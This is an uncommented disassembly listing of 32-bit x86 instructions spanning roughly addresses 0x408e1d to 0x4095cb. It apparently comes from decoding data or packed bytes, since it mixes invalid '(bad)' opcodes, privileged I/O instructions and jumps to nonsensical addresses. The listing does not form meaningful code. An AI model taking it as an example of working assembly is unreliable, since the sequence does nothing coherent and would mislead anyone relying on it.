  408e1d:	in     eax,dx
  408e1e:	mov    ch,0x47
  408e20:	and    al,0x3
  408e22:	lea    eax,[ebx+0x10]
  408e25:	push   eax
  408e26:	test   BYTE PTR [ebx+eiz*1+0x18],dl
  408e2a:	out    0xc2,eax
  408e2c:	or     DWORD PTR [ebp-0x5ebdf72d],edx
  408e32:	xchg   ecx,eax
  408e33:	daa    
  408e34:	pop    esi
  408e35:	clc    
  408e36:	pop    eax
  408e37:	mov    ecx,0xbcbb8a6
  408e3c:	push   0xffffff88
  408e3e:	xor    al,0x47
  408e40:	mov    eax,cs:0x40c4b6c1
  408e46:	cmp    BYTE PTR [ecx-0x48bb8ff1],dl
  408e4c:	xchg   esp,eax
  408e4d:	inc    edi
  408e4e:	push   esi
  408e4f:	cmp    eax,0x7e01c828
  408e54:	add    esi,DWORD PTR [ecx+ebx*2-0x6e]
  408e58:	and    dh,BYTE PTR [esi+edi*8]
  408e5b:	dec    ecx
  408e5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e5d:	and    BYTE PTR [esi+ebp*4],cl
  408e60:	add    esp,DWORD PTR [ebx]
  408e62:	ror    esp,cl
  408e64:	add    DWORD PTR [ebx],0x4e1eb61a
  408e6a:	mov    ebx,0x42a4044
  408e6f:	push   cs
  408e70:	iret   
  408e71:	jo     0x408e00
  408e73:	adc    DWORD PTR ds:[edx+0x34],edi
  408e77:	cmc    
  408e78:	sbb    dh,dl
  408e7a:	mov    esi,DWORD PTR [edi+0x43]
  408e7d:	pop    edx
  408e7e:	xchg   esi,eax
  408e7f:	xor    eax,0x563e5a59
  408e84:	fxch   st(5)
  408e86:	push   cs
  408e87:	mov    edx,0x49c345e6
  408e8c:	cwde   
  408e8d:	jmp    0x229:0xe3acf936
  408e94:	jae    0x408e95
  408e96:	aad    0x76
  408e98:	add    ebx,esp
  408e9a:	call   0x955949a6
  408e9f:	clc    
  408ea0:	dec    ecx
  408ea1:	mov    eax,edx
  408ea3:	mov    DWORD PTR [edi],ebp
  408ea5:	adc    al,0x83
  408ea7:	jge    0x408ea0
  408ea9:	aas    
  408eaa:	or     DWORD PTR [edi-0x62],esi
  408ead:	or     eax,DWORD PTR [ecx+0x7280b07d]
  408eb3:	pop    ss
  408eb4:	jmp    0x408eb8
  408eb6:	jl     0x408ecb
  408eb8:	and    al,0xb1
  408eba:	jge    0x408eee
  408ebc:	xchg   esi,eax
  408ebd:	add    BYTE PTR [esi+esi*2+0x1b],ch
  408ec1:	and    al,0x7e
  408ec3:	pop    ss
  408ec4:	(bad)  
  408ec6:	inc    eax
  408ec7:	aaa    
  408ec8:	call   0x62550425
  408ecd:	jne    0x408ee4
  408ecf:	cmp    BYTE PTR [esp+edi*8],ch
  408ed2:	loopne 0x408e95
  408ed4:	mov    ebx,0xd8523304
  408ed9:	and    eax,0x558d0ff7
  408ede:	inc    esi
  408edf:	bound  edi,QWORD PTR [ecx+0x190b0b95]
  408ee5:	adc    bh,BYTE PTR [edx+0x4c]
  408ee8:	mov    ecx,0x5044725
  408eed:	jo     0x408e93
  408eef:	pop    ebp
  408ef0:	or     DWORD PTR [esi+0x23f18834],ebp
  408ef6:	mov    cl,0x4a
  408ef8:	push   edi
  408ef9:	pop    edx
  408efa:	xlat   BYTE PTR ds:[ebx]
  408efb:	pop    ss
  408efc:	jnp    0x408f4f
  408efe:	test   al,0x0
  408f00:	sub    al,0xe6
  408f02:	dec    edi
  408f03:	lea    ebx,[ebp+0x3]
  408f06:	fadd   DWORD PTR [edi-0x5f6c1f73]
  408f0c:	push   es
  408f0d:	mov    ds:0x9e1e2530,al
  408f12:	iret   
  408f13:	sub    al,0xa0
  408f15:	hlt    
  408f16:	add    DWORD PTR [eax+0x40],ebp
  408f19:	or     ecx,eax
  408f1b:	dec    esp
  408f1c:	out    dx,al
  408f1d:	mov    ds:0xa213db0,eax
  408f22:	sbb    bh,BYTE PTR [ebx]
  408f24:	add    eax,0x1ce87506
  408f29:	inc    eax
  408f2a:	loop   0x408f63
  408f2c:	stos   BYTE PTR es:[edi],al
  408f2d:	and    BYTE PTR [ebp-0x52],dl
  408f30:	cld    
  408f31:	pop    ecx
  408f32:	popfw  
  408f34:	cli    
  408f35:	dec    esp
  408f36:	loopne 0x408f68
  408f38:	jne    0x408f22
  408f3a:	sub    al,0x3b
  408f3c:	or     dh,BYTE PTR [ebx]
  408f3e:	pop    edx
  408f3f:	(bad)  
  408f40:	fbstp  TBYTE PTR [eax+ebp*8]
  408f43:	cdq    
  408f44:	push   edx
  408f45:	push   eax
  408f46:	mov    dl,BYTE PTR [ebp-0x1a]
  408f49:	(bad)  
  408f4a:	jo     0x408ed1
  408f4c:	adc    DWORD PTR [edx],0x34d3f82f
  408f52:	ror    DWORD PTR [eax-0x2b],1
  408f55:	push   ebp
  408f56:	dec    esi
  408f57:	retf   
  408f58:	sbb    cl,ch
  408f5a:	jo     0x408f5e
  408f5c:	das    
  408f5d:	adc    al,0x99
  408f5f:	push   cs
  408f60:	dec    edx
  408f61:	and    BYTE PTR [eax+esi*1],ch
  408f64:	xchg   edx,eax
  408f65:	ret    
  408f66:	fisub  WORD PTR [ebx+0x9]
  408f69:	sub    BYTE PTR [ebx+eax*8+0x60],bl
  408f6d:	xchg   ebx,eax
  408f6e:	lock mov eax,ds:0xac5c9653
  408f74:	adc    ah,dl
  408f76:	push   ebp
  408f77:	inc    eax
  408f78:	pop    esi
  408f79:	ds mov dl,0x68
  408f7c:	push   edi
  408f7d:	test   al,0xf3
  408f7f:	ja     0x408f05
  408f81:	aad    0x5
  408f83:	popa   
  408f84:	sub    DWORD PTR [ecx],0xb38be122
  408f8a:	mov    DWORD PTR [edi+0x4],esi
  408f8d:	inc    ebp
  408f8e:	adc    eax,DWORD PTR [ecx+0x6153023f]
  408f94:	dec    eax
  408f95:	cmp    DWORD PTR [eax+ecx*8+0x72002130],0x1f
  408f9d:	je     0x408f7a
  408f9f:	push   edi
  408fa0:	add    al,0x22
  408fa2:	ja     0x408f27
  408fa4:	loop   0x409025
  408fa6:	cmp    eax,0x82041213
  408fab:	mov    al,ds:0x8f8e7d81
  408fb0:	add    DWORD PTR [ebx],0xffffffba
  408fb3:	out    dx,al
  408fb4:	aam    0x98
  408fb6:	sub    al,0x85
  408fb8:	pop    eax
  408fb9:	sbb    cl,BYTE PTR [eax]
  408fbb:	xor    al,0xff
  408fbd:	(bad)  
  408fbe:	xor    al,0x52
  408fc0:	xchg   esp,eax
  408fc1:	jg     0x408fdc
  408fc3:	fnstenv [esi-0x7e]
  408fc6:	clc    
  408fc7:	test   al,0x4a
  408fc9:	sbb    al,0xa5
  408fcb:	hlt    
  408fcc:	xlat   BYTE PTR ds:[ebx]
  408fcd:	(bad)  
  408fce:	loope  0x408fb8
  408fd0:	add    al,0x65
  408fd2:	data16 jo 0x409025
  408fd5:	pushf  
  408fd6:	ror    BYTE PTR [ecx+0x7c0c5180],0x3b
  408fdd:	push   esp
  408fde:	adc    BYTE PTR [edx+eax*2-0x65eb8825],ch
  408fe5:	jbe    0x408faf
  408fe7:	(bad)  
  408fe9:	add    al,0xe8
  408feb:	in     al,0x87
  408fed:	or     BYTE PTR [ebp+0x60],ah
  408ff0:	fcomip st,st(1)
  408ff2:	into   
  408ff3:	mov    bh,0x34
  408ff5:	stc    
  408ff6:	or     DWORD PTR [eax+0x34961da9],ebp
  408ffc:	cmp    BYTE PTR [edx+0x69750036],ah
  409002:	dec    esp
  409003:	mov    cl,0x40
  409006:	inc    ebx
  409007:	sbb    ebp,DWORD PTR [esi+0xb899012]
  40900d:	adc    al,0x7b
  40900f:	add    al,0xde
  409011:	pusha  
  409012:	cdq    
  409013:	sub    cl,BYTE PTR [eax]
  409015:	lods   eax,DWORD PTR ds:[esi]
  409016:	fbld   TBYTE PTR [edx-0x50]
  409019:	or     BYTE PTR [eax+0x41],bl
  40901c:	push   eax
  40901d:	mov    ebx,0x9c145fcc
  409022:	std    
  409023:	xchg   edi,eax
  409024:	mov    bl,BYTE PTR [eax+eax*8]
  409027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409028:	pop    es
  409029:	adc    BYTE PTR [ebx],al
  40902b:	or     ecx,DWORD PTR [eax+0x2fa27203]
  409031:	jmp    0xec32d4fb
  409036:	or     ebx,ecx
  409038:	popf   
  409039:	lea    esp,[ebx+0x2]
  40903c:	shl    DWORD PTR [eax-0x3c],1
  40903f:	cdq    
  409040:	nop
  409041:	inc    ebx
  409042:	fidivr DWORD PTR [ebp+0x48]
  409045:	enter  0xe0e0,0xdc
  409049:	nop
  40904a:	retf   
  40904b:	or     edi,DWORD PTR [ecx]
  40904d:	fdivr  QWORD PTR [eax+0x56]
  409050:	mov    al,ds:0x34b30f34
  409055:	fnsave [eax-0x5323bee3]
  40905b:	cmp    BYTE PTR [ebp+0x4a06991],al
  409061:	push   cs
  409062:	sub    al,0x9
  409064:	inc    DWORD PTR [edx]
  409066:	sbb    eax,0x446f02a
  40906b:	push   0x5
  40906d:	cmp    eax,0x185355d8
  409072:	jno    0x40907d
  409074:	iret   
  409075:	sub    BYTE PTR [edi+eiz*1],bh
  409078:	lea    ebx,[ebx+0x63685c3d]
  40907e:	shl    BYTE PTR ds:0xa18689ad,0x17
  409085:	inc    edi
  409086:	or     al,0xb2
  409088:	sbb    ah,BYTE PTR [ebx]
  40908a:	inc    esp
  40908b:	scas   al,BYTE PTR es:[edi]
  40908c:	mov    ds:0x1a725f1e,eax
  409091:	js     0x4090bb
  409093:	push   ebp
  409094:	inc    esp
  409095:	popa   
  409096:	mov    eax,ds:0x52143021
  40909b:	std    
  40909c:	or     BYTE PTR [edi+ebp*2-0x569b5e6],dh
  4090a3:	and    eax,0x3c24f81a
  4090a8:	dec    esp
  4090a9:	and    ebp,esp
  4090ab:	and    dh,ch
  4090ad:	lea    eax,[ebx+0x10e1ddb0]
  4090b3:	pop    ebx
  4090b4:	dec    esi
  4090b5:	mov    cl,0x1b
  4090b7:	in     al,0x88
  4090b9:	sub    edi,DWORD PTR [edx+ebp*4+0x584ae7be]
  4090c0:	data16 rol ah,cl
  4090c3:	stos   DWORD PTR es:[edi],eax
  4090c4:	out    dx,al
  4090c5:	mov    eax,ds:0xa7ac11e0
  4090ca:	dec    ebp
  4090cb:	je     0x409138
  4090cd:	inc    ebp
  4090ce:	or     dl,BYTE PTR [esi+0x1f2bc90c]
  4090d4:	sub    DWORD PTR [eax],edi
  4090d6:	add    al,0xf
  4090d8:	cdq    
  4090d9:	and    BYTE PTR [eax+0xf],dl
  4090dc:	xlat   BYTE PTR ds:[ebx]
  4090dd:	xor    bl,BYTE PTR [edi]
  4090df:	cmp    DWORD PTR [edx],edx
  4090e1:	or     BYTE PTR [ecx],ah
  4090e3:	jg     0x4090f1
  4090e5:	add    edi,DWORD PTR [ecx+0x50b4d652]
  4090eb:	xchg   esp,eax
  4090ec:	sbb    ecx,DWORD PTR [edi+0x5a]
  4090ef:	sub    DWORD PTR [eax-0x48cb3f1c],esp
  4090f5:	push   ebx
  4090f6:	push   DWORD PTR [edi+ebx*8+0x3a14120f]
  4090fd:	fmul   st,st(6)
  4090ff:	dec    esi
  409100:	adc    BYTE PTR [ebx],bl
  409102:	outs   dx,DWORD PTR ds:[esi]
  409103:	mov    BYTE PTR [edi+0x432413ee],ch
  409109:	dec    esp
  40910a:	cldemote BYTE PTR [ecx+0x53]
  40910e:	loopne 0x4090c1
  409110:	mov    DWORD PTR [esp+eax*4+0x27d64bff],eax
  409117:	test   bl,al
  409119:	ror    BYTE PTR [ebx+0x1d],1
  40911c:	into   
  40911d:	out    dx,al
  40911e:	in     eax,dx
  40911f:	call   FWORD PTR [edx-0x397634f2]
  409125:	jmp    0x40915d
  409127:	mov    ecx,DWORD PTR [esi+0x14]
  40912a:	sub    ecx,DWORD PTR [eax-0xf76f589]
  409130:	sub    DWORD PTR [esp+edi*1],0xfffffffc
  409134:	mov    edi,0xd9391cec
  409139:	jb     0x40913d
  40913b:	mov    ecx,ebx
  40913d:	push   esi
  40913e:	sub    ebx,ecx
  409140:	loop   0x409145
  409142:	je     0x4090d7
  409144:	fmul   DWORD PTR [esp+esi*4+0x3a]
  409148:	dec    esi
  409149:	mov    edx,ecx
  40914b:	inc    eax
  40914c:	cld    
  40914d:	loope  0x4091a6
  40914f:	mov    edx,0x5ed14249
  409154:	or     ebx,ebx
  409156:	jne    0x40911e
  409158:	pop    ebx
  409159:	ds inc edx
  40915b:	ret    
  40915c:	add    BYTE PTR [edi],cl
  40915e:	fcomp  DWORD PTR [esi]
  409160:	dec    ebx
  409161:	or     al,0xa
  409163:	mov    BYTE PTR [edi-0x53],ah
  409166:	mov    al,ds:0x38142887
  40916b:	inc    ebp
  40916c:	or     eax,0xf0177e36
  409171:	or     al,0x9e
  409173:	mov    eax,0xe2a728c6
  409178:	adc    BYTE PTR [edi+0x6740def1],cl
  40917e:	xor    al,0xe9
  409180:	pop    eax
  409181:	push   edx
  409182:	sysret 
  409184:	adc    DWORD PTR [ecx+0x34],esp
  409187:	(bad)  
  409188:	or     eax,0xdd1a6f02
  40918d:	ret    
  40918e:	sub    esp,DWORD PTR [eax-0x627e4e4c]
  409194:	jb     0x40911a
  409196:	pop    ss
  409197:	fwait
  409198:	and    eax,0x84a03bb6
  40919d:	xchg   edx,eax
  40919e:	sub    al,0x45
  4091a0:	call   0xaa023674
  4091a5:	out    dx,eax
  4091a6:	fwait
  4091a7:	and    eax,0x94a4121
  4091ac:	iret   
  4091ad:	and    dl,BYTE PTR [ebx-0x70]
  4091b0:	sub    al,0x12
  4091b2:	or     al,0xbd
  4091b4:	lock sub edx,esp
  4091b7:	add    dh,BYTE PTR [ebp-0x6c]
  4091ba:	clc    
  4091bb:	and    edx,DWORD PTR [ecx]
  4091bd:	xor    BYTE PTR [edx+edi*2+0x8],dh
  4091c1:	js     0x4091eb
  4091c3:	sub    ebx,0xe970fc09
  4091c9:	neg    DWORD PTR [ebx]
  4091cb:	push   ebx
  4091cc:	sub    al,0x6
  4091ce:	je     0x4091d6
  4091d0:	push   es
  4091d1:	adc    ebp,ebx
  4091d3:	and    bh,BYTE PTR [eax]
  4091d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091d6:	sbb    eax,0xe1f3935
  4091db:	and    BYTE PTR [eax+edx*1],al
  4091de:	sar    DWORD PTR [eax-0x48],cl
  4091e1:	add    eax,0xe7accbf9
  4091e6:	lods   eax,DWORD PTR ds:[esi]
  4091e7:	scas   al,BYTE PTR es:[edi]
  4091e8:	mov    esi,0xb0391b16
  4091ed:	xchg   edx,eax
  4091ee:	xchg   ebx,eax
  4091ef:	inc    ebx
  4091f0:	cvttps2pi mm4,QWORD PTR [ecx]
  4091f3:	xor    dl,BYTE PTR [esp+edi*4]
  4091f6:	lods   eax,DWORD PTR cs:[esi]
  4091f8:	jle    0x409209
  4091fa:	or     esp,DWORD PTR [edx]
  4091fc:	jae    0x4091a3
  4091fe:	xchg   esi,eax
  4091ff:	retf   0x633
  409202:	push   es
  409203:	hlt    
  409204:	pop    es
  409205:	pop    es
  409206:	rcl    DWORD PTR [eax+edx*8+0x127377ab],0x8
  40920e:	push   ss
  40920f:	sar    DWORD PTR [edi],0x2
  409212:	je     0x40923f
  409214:	jmp    0x409272
  409216:	push   ecx
  409217:	inc    ebx
  409218:	pop    ss
  409219:	or     al,0x7e
  40921b:	imul   esi,DWORD PTR [esp+esi*1],0x3
  40921f:	leave  
  409220:	dec    esp
  409221:	cmp    DWORD PTR [eax],0x62c18230
  409227:	push   ecx
  409228:	dec    esi
  409229:	xchg   edi,eax
  40922a:	push   es
  40922b:	dec    ebx
  40922c:	mov    eax,fs
  40922e:	cmp    al,0x99
  409230:	dec    edx
  409231:	and    esp,0x30
  409234:	imul   eax,ecx,0x91e79845
  40923a:	adc    ah,BYTE PTR [edx]
  40923c:	dec    edi
  40923d:	cwde   
  40923e:	test   al,0x34
  409240:	lods   eax,DWORD PTR ds:[esi]
  409241:	call   0xdf5b26d9
  409246:	mov    dl,BYTE PTR [ecx-0x55]
  409249:	xchg   ecx,eax
  40924a:	mov    dl,BYTE PTR [eax+0x25]
  40924d:	xor    eax,DWORD PTR [edx]
  40924f:	mov    eax,ds:0xd0220b1f
  409254:	adc    dl,0x83
  409257:	ret    
  409258:	cmp    BYTE PTR [ecx+0x1c91a8f0],bl
  40925e:	and    edi,edi
  409260:	and    al,BYTE PTR [ecx]
  409262:	cli    
  409263:	fistp  DWORD PTR [eax-0x19]
  409266:	xchg   esi,eax
  409267:	add    ebx,0xfffffffc
  40926a:	xlat   BYTE PTR ds:[ebx]
  40926b:	pop    eax
  40926c:	out    dx,eax
  40926d:	test   eax,0xd1f03d6
  409272:	sub    esi,ebp
  409274:	adc    al,0xbb
  409276:	inc    edi
  409277:	rcl    BYTE PTR [ebx-0x14],1
  40927a:	pop    es
  40927b:	push   ecx
  40927c:	fadd   st(0),st
  40927e:	dec    edx
  40927f:	jo     0x4092f1
  409281:	mov    BYTE PTR ds:0x52fbb3e7,ch
  409287:	mov    dh,0x48
  409289:	mov    al,0xaf
  40928b:	shr    DWORD PTR [ebx],cl
  40928d:	inc    esp
  40928e:	or     BYTE PTR [edi+0x4367f694],ch
  409294:	cmp    esp,DWORD PTR [ecx+0x2cfe0490]
  40929a:	add    esi,DWORD PTR [ebx-0x37]
  40929d:	dec    edx
  40929e:	fisubr WORD PTR [esi]
  4092a0:	xchg   DWORD PTR [ebp-0x3feb0ca0],ebp
  4092a6:	mov    ss,WORD PTR [esi-0x45e8beb4]
  4092ac:	pop    edi
  4092ad:	dec    edx
  4092ae:	cmp    eax,0xbbaa8942
  4092b3:	mov    bh,0x24
  4092b5:	dec    ecx
  4092b6:	imul   ebp,DWORD PTR [ecx],0x4a92b160
  4092bc:	mov    ebp,0x1b0b4bd7
  4092c1:	dec    ecx
  4092c2:	pop    edi
  4092c3:	and    edi,DWORD PTR [eax+ecx*2-0x48]
  4092c7:	in     al,0xf3
  4092c9:	cmp    al,0xef
  4092cb:	push   cs
  4092cc:	les    eax,FWORD PTR [esi]
  4092ce:	(bad)  
  4092cf:	call   0x9d649fce
  4092d4:	cmp    al,0xef
  4092d6:	mov    eax,fs:0x342a1e1c
  4092dc:	inc    edx
  4092dd:	out    0x79,eax
  4092df:	sahf   
  4092e0:	out    0x6,eax
  4092e2:	dec    ebx
  4092e3:	pop    edx
  4092e4:	imul   edi,DWORD PTR [eax-0x7a],0x9e0f76f0
  4092eb:	xchg   ebp,eax
  4092ec:	jmp    0xe396305d
  4092f1:	jo     0x40934c
  4092f3:	pop    ss
  4092f4:	fs xchg esi,eax
  4092f6:	and    DWORD PTR [ecx],edx
  4092f8:	mov    ecx,0x85022313
  4092fd:	in     al,0x48
  4092ff:	mov    es,WORD PTR [edx+ecx*1]
  409302:	or     eax,0xca3bc5b3
  409307:	pop    ds
  409308:	xchg   esp,eax
  409309:	(bad)  
  40930a:	mov    eax,0x40bec15d
  40930f:	hlt    
  409310:	adc    bl,BYTE PTR [eax+0x28cb6659]
  409316:	jmp    0x409385
  409318:	das    
  409319:	sti    
  40931a:	rcr    DWORD PTR [edx+0x11555fee],0xc8
  409321:	push   esi
  409322:	(bad)
  409325:	mov    edx,0x36921d08
  40932a:	and    DWORD PTR [ebx],eax
  40932c:	cmp    BYTE PTR [ecx],ch
  40932e:	xchg   BYTE PTR [edx],al
  409330:	pop    eax
  409331:	or     DWORD PTR [ebp+0x6c],0xc10c391b
  409338:	lods   eax,DWORD PTR ds:[esi]
  409339:	push   0x24
  40933b:	xchg   DWORD PTR ds:0x8a1f24be,eax
  409341:	xchg   edi,eax
  409342:	xchg   edx,eax
  409343:	pop    ss
  409344:	das    
  409345:	add    DWORD PTR ds:0x255fc0d,esp
  40934b:	jns    0x409391
  40934d:	xor    DWORD PTR [eax],ecx
  40934f:	and    eax,0x31625e9c
  409354:	add    eax,0x2f7e9cd9
  409359:	push   0xffffff92
  40935b:	xor    al,0x82
  40935d:	ins    BYTE PTR es:[edi],dx
  40935e:	xor    al,0x16
  409360:	fisttp QWORD PTR [edi]
  409362:	sub    esi,DWORD PTR [edi+0x14]
  409365:	adc    DWORD PTR [ebx-0xa],edi
  409368:	sub    ebx,0xb7b6eb19
  40936e:	xor    DWORD PTR [ebp+0x3325c00d],eax
  409374:	fistp  DWORD PTR [edi+edi*2-0x2f]
  409378:	cs lock imul esp,edx,0xd65ecb78
  409380:	sbb    ch,bl
  409382:	mov    esp,0xc4fc769
  409387:	sub    ecx,DWORD PTR [edi-0x6d]
  40938a:	pushf  
  40938b:	xor    eax,0x1ce05fa1
  409390:	pop    edi
  409391:	sub    ebx,ecx
  409393:	push   edi
  409394:	xchg   esi,eax
  409395:	dec    esp
  409396:	adc    al,0x30
  409398:	jnp    0x40939d
  40939a:	inc    edi
  40939b:	adc    BYTE PTR [ecx],al
  40939d:	cmp    cl,BYTE PTR [esi+0x5f]
  4093a0:	pop    edi
  4093a1:	add    BYTE PTR [ebx],dh
  4093a3:	add    eax,0x16105d96
  4093a8:	mov    al,0x5
  4093aa:	push   cs
  4093ab:	mov    ebx,0xe317c61c
  4093b0:	ss jno 0x40937e
  4093b3:	push   ss
  4093b4:	mov    al,0xe
  4093b6:	lahf   
  4093b7:	dec    esi
  4093b8:	or     BYTE PTR [edi-0x6fcfe2b8],bl
  4093be:	je     0x4093ef
  4093c0:	inc    edi
  4093c1:	and    DWORD PTR [edi],0x52
  4093c4:	aad    0x7c
  4093c6:	mov    dl,0x32
  4093c8:	push   ecx
  4093c9:	xchg   esi,eax
  4093ca:	mov    ds:0x735c7423,al
  4093cf:	adc    eax,0x463a0a7c
  4093d4:	or     BYTE PTR [edi+0x17],ch
  4093d7:	jmp    0x409428
  4093d9:	dec    ebp
  4093da:	or     DWORD PTR [ebx+edi*8+0x53],0x7f4a9210
  4093e2:	sbb    DWORD PTR [edx+0x24016f06],esi
  4093e8:	adc    ebp,esp
  4093ea:	xchg   ebx,eax
  4093eb:	jmp    0x409404
  4093ed:	mov    dl,0xc
  4093ef:	mov    eax,ds:0x3b01afd6
  4093f4:	mov    eax,ds:0x26a54f07
  4093f9:	or     eax,0x79083430
  4093fe:	cmp    al,0x61
  409400:	(bad)  
  409401:	enter  0xa1,0x66
  409405:	les    esi,FWORD PTR [bx-0x54]
  409409:	es add al,0x2b
  40940c:	add    eax,DWORD PTR [edi+0x51]
  40940f:	loopne 0x409430
  409411:	pop    ss
  409412:	inc    ecx
  409413:	aas    
  409414:	mov    dl,0xd1
  409416:	push   es
  409417:	push   0x8e687d60
  40941c:	je     0x409436
  40941e:	mov    eax,0xffdc74f8
  409423:	mov    ds:0xa0684848,eax
  409428:	sti    
  409429:	xor    al,BYTE PTR [ebx-0x1efff4c3]
  40942f:	mov    eax,0x734032c7
  409434:	sbb    BYTE PTR [bx+di+0x783a],ah
  409439:	xchg   edi,eax
  40943a:	rcr    BYTE PTR ss:[ebp+0x57],0xa1
  40943f:	push   eax
  409440:	add    cl,BYTE PTR [ebx+0x1e]
  409443:	pop    esp
  409444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409445:	imul   esp,DWORD PTR [edi],0x5488938c
  40944b:	mov    edx,0xb8730b15
  409450:	push   eax
  409451:	add    BYTE PTR [eax-0x12],ch
  409454:	jnp    0x4094c6
  409456:	daa    
  409457:	xchg   edi,eax
  409458:	outs   dx,BYTE PTR ds:[esi]
  409459:	pop    ebx
  40945a:	dec    eax
  40945b:	push   eax
  40945c:	and    ebx,DWORD PTR [eax+0x40]
  40945f:	and    BYTE PTR [edx],0x97
  409462:	rol    bl,1
  409464:	push   es
  409465:	in     eax,dx
  409466:	adc    al,0x9e
  409468:	inc    ecx
  409469:	ds push ds
  40946b:	sub    al,0x28
  40946d:	inc    ecx
  40946e:	dec    esp
  40946f:	jge    0x409478
  409471:	loopne 0x409429
  409473:	adc    eax,0x44a14a49
  409478:	and    BYTE PTR [ebp+0x5a],bh
  40947b:	xor    ch,al
  40947d:	add    ebp,edx
  40947f:	pop    ss
  409480:	adc    dl,dh
  409482:	pusha  
  409483:	xchg   edi,eax
  409484:	add    al,0xe
  409486:	icebp  
  409487:	mov    eax,0x7b45b804
  40948c:	ss imul ebp,edi,0x8df848f4
  409493:	sbb    BYTE PTR [eax+0x1254321f],0xed
  40949a:	das    
  40949b:	fwait
  40949c:	xchg   ecx,eax
  40949d:	inc    esp
  40949e:	inc    edx
  40949f:	and    BYTE PTR [edi],0x40
  4094a2:	fs mov eax,0x43b5390
  4094a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094a9:	jbe    0x409436
  4094ab:	xchg   ecx,eax
  4094ac:	clc    
  4094ad:	mov    eax,0x22c15958
  4094b2:	leave  
  4094b3:	inc    ebx
  4094b4:	ins    DWORD PTR es:[edi],dx
  4094b5:	xor    ebp,DWORD PTR [eax]
  4094b7:	inc    ecx
  4094b8:	push   es
  4094b9:	pop    edi
  4094ba:	xchg   ebp,eax
  4094bb:	or     esp,DWORD PTR [ecx+0x4c6fc173]
  4094c1:	popa   
  4094c2:	iret   
  4094c3:	adc    cl,BYTE PTR [esi-0x343b668b]
  4094c9:	pop    esp
  4094ca:	pop    eax
  4094cb:	push   0xfffffffb
  4094cd:	imul   eax,DWORD PTR [ecx],0xffffff9f
  4094d0:	inc    eax
  4094d1:	test   al,0x30
  4094d3:	push   esp
  4094d4:	je     0x4094d9
  4094d6:	sub    edx,0xffffffd4
  4094d9:	ret    
  4094da:	clc    
  4094db:	push   edx
  4094dc:	dec    ebp
  4094dd:	sbb    al,0x1c
  4094df:	dec    edx
  4094e0:	enter  0x9cec,0xa3
  4094e4:	and    ecx,edi
  4094e6:	in     eax,0x33
  4094e8:	pop    ebp
  4094e9:	and    BYTE PTR [ebp+esi*8-0xe],bh
  4094ed:	or     BYTE PTR [ebx+0x4725a50],ah
  4094f3:	push   es
  4094f4:	aad    0x29
  4094f6:	enter  0x8372,0xb9
  4094fa:	adc    BYTE PTR [edi],bh
  4094fc:	xchg   edi,eax
  4094fd:	xchg   edi,eax
  4094fe:	stc    
  4094ff:	enter  0x557,0x5d
  409503:	js     0x40950c
  409505:	add    BYTE PTR [ecx],ch
  409507:	inc    ecx
  409508:	mov    edi,edi
  40950a:	stos   DWORD PTR es:[edi],eax
  40950b:	dec    esp
  40950c:	js     0x40951e
  40950e:	add    DWORD PTR cs:[esi],eax
  409511:	push   esp
  409512:	inc    ebx
  409513:	outs   dx,DWORD PTR ds:[esi]
  409514:	ins    BYTE PTR es:[edi],dx
  409515:	outs   dx,DWORD PTR ds:[esi]
  409516:	jb     0x40958f
  409518:	lock nop
  40951a:	xor    edx,edi
  40951c:	dec    eax
  40951d:	(bad)  
  40951e:	sub    BYTE PTR [edi],ch
  409520:	call   0xcb89fa0
  409525:	push   esp
  409526:	inc    esi
  409527:	outs   dx,DWORD PTR ds:[esi]
  409528:	lahf   
  409529:	jb     0x40959e
  40952b:	gs je  0x40952f
  40952e:	add    ch,ch
  409530:	sahf   
  409531:	and    esi,DWORD PTR [edi+edi*8-0x3fec974]
  409538:	push   ebp
  409539:	xchg   ecx,esp
  40953b:	aas    
  40953c:	out    dx,eax
  40953d:	fsubr  QWORD PTR [ecx]
  40953f:	inc    ecx
  409540:	add    BYTE PTR [eax],dl
  409542:	mov    WORD PTR [esp+edi*8-0x21],fs
  409546:	jae    0x4095b7
  409548:	jne    0x4095bc
  40954a:	arpl   WORD PTR [ebp+0x4d],sp
  40954d:	popa   
  40954e:	outs   dx,BYTE PTR ds:[esi]
  40954f:	popa   
  409550:	addr16 lahf 
  409552:	push   esp
  409553:	les    edx,FWORD PTR [ebx-0x7d]
  409556:	ror    DWORD PTR [ecx+0x711d204e],0x2b
  40955d:	es and dh,bh
  409560:	jbe    0x409584
  409562:	add    al,BYTE PTR [esi-0x7f]
  409565:	mov    esi,DWORD PTR [edi]
  409567:	xchg   edx,eax
  409568:	push   ss
  409569:	add    al,0xc6
  40956b:	pop    ds
  40956c:	jo     0x409501
  40956e:	mov    edi,0x6307aef9
  409573:	ins    BYTE PTR es:[edi],dx
  409574:	inc    edx
  409575:	ins    BYTE PTR es:[edi],dx
  409576:	popa   
  409577:	arpl   WORD PTR [ebx+0x1e],bp
  40957a:	cmp    dh,dh
  40957c:	pusha  
  40957d:	pop    eax
  40957e:	ss jb  0x4095f0
  409581:	adc    al,BYTE PTR [ecx]
  409583:	inc    edi
  409584:	inc    edi
  409585:	sbb    DWORD PTR [edi+0x6e841b55],ebp
  40958b:	pop    ds
  40958c:	dec    edi
  40958d:	ins    BYTE PTR es:[edi],dx
  40958e:	push   DWORD PTR [esi]
  409590:	dec    ecx
  409591:	sub    bh,BYTE PTR [edi+ecx*1]
  409594:	xchg   BYTE PTR [esi+0x61],cl
  409597:	jbe    0x409612
  409599:	add    BYTE PTR [edi+0x5025fe4d],bh
  40959f:	jne    0x409613
  4095a1:	jo     0x40960f
  4095a3:	gs inc edi
  4095a5:	push   esp
  4095a6:	gs popa 
  4095a8:	ins    BYTE PTR es:[edi],dx
  4095a9:	stc    
  4095aa:	pop    es
  4095ab:	jnp    0x409618
  4095ad:	pop    ds
  4095ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095af:	popa   
  4095b0:	addr16 push ebx
  4095b2:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x586b0772
  4095ba:	push   es
  4095bb:	add    eax,0x4c87645e
  4095c0:	mov    al,0xe4
  4095c2:	paddsb mm5,QWORD PTR [ecx+0x6d]
  4095c6:	gs iret 
  4095c8:	pop    ecx
  4095c9:	gs ins BYTE PTR es:[edi],dx
  4095cb:	ins    BYTE PTR es:[edi],dx
